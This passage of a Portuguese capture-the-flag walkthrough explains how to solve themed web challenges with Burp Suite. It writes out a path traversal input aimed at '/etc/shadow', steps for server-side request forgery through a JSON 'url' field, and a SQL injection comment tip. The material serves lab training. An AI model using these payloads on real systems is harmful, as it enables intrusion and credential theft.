5. Use a Câmara de Decifração na página aberta pelo navegador do Burp, informando a cifra Base64 e a chave repetida. O resultado de XOR é a prova da Terra; ao enviar o formulário, o Burp registra `POST /reward.php` e a resposta com a flag.
6. Não retire o espaço após os dois hífens no final dos payloads. `-- -` é necessário para o comentário ser reconhecido pelo MariaDB.

## VI · Luz & Trevas no Burp

### Trevas

1. Abra `/arquivo-sombras` no navegador do Burp e envie um caminho comum. No **HTTP history**, envie a requisição `GET /shadow.php?path=...` ao Repeater.
2. Altere somente `path` para `../../../../../etc/shadow`. A resposta do Repeater é o arquivo virtual e contém `fragmento_trevas=UMBRA-...`. Copie o valor completo.

### Luz

3. Abra o Observatório pelo navegador do Burp e envie `http://celeste.luz/zenite` no prisma. No histórico, envie `POST /prisma.php` ao Repeater. Preserve o host do desafio e `oracle_challenge`; altere apenas o JSON `url`.
4. Use o `farol` retornado em `http://celeste.luz/<farol>/manifesto`. A resposta fornece a primeira metade do nome final e o próximo `farol`.
5. Envie `http://celeste.luz/<segundo-farol>/selos`. Una as duas metades do nome na ordem recebida. Consulte a raiz `http://<nome>.luz/` para confirmar `seal: fragmento` e então envie `http://<nome>.luz/fragmento`.
6. Cada envio é uma requisição ao mesmo `POST /prisma.php`; modifique o valor JSON `url` no Repeater e clique **Send**. Não tente abrir os hosts `.luz` diretamente no navegador: o backend encaminha essas URLs à torre isolada.
7. Copie `fragmento_trevas` e `fragmento_luz` para o Limiar na página do desafio. Envie o formulário pelo navegador do Burp. O histórico mostra `POST /reward.php` e a resposta JSON com a flag.

## Entregar as flags pelo portal

Depois de obter uma flag, use o navegador do Burp para voltar ao Oráculo, colar a flag no formulário e submetê-la. A chamada do portal aparecerá no **HTTP history**; a resposta confirmará a validação e os pontos. Repita para cada desafio.

### Referências oficiais do Burp

- [Abrir e usar o navegador do Burp](https://portswigger.net/burp/documentation/desktop/tools/burps-browser)
- [Ver e filtrar o HTTP history](https://portswigger.net/burp/documentation/desktop/tools/proxy/http-history)
- [Editar e reenviar mensagens no Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater/http-messages)
- [Usar Sniper e uma lista no Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/getting-started)
- [Decodificar e calcular hashes no Decoder](https://portswigger.net/burp/documentation/desktop/tools/decoder)
- [Enviar grupos de requisições em paralelo](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group)
